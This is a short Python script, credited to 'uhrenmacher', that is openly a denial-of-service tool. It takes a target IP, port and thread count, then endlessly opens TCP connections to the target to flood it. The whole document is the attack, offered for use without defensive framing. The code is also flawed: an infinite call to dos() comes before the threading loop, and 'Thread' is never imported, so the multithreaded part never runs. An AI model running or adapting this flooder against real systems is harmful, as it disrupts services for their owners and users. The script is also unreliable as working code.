#Script made by uhrenmacher | GPL.v2
import socket
import threading
#############
#Global vars#
#############
ip = "127.0.0.1" #the targeted ip
port = 80 # the port you wish to attack
number_of_threads = 4 #just the number of threads
def dos():
    print("[*] Executing Script.")
    print("[*] IP:", ip, "Port:", port);
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((ip, port))
            client.send(str.encode("")) # requested message
            client.sendto(str.encode(""), (ip, port))
        except socket.error:
            print("[*] Error: socket_error")
        client.close()

dos()
for i in range(number_of_threads):
    t = Thread(target=dos)
    t.start()
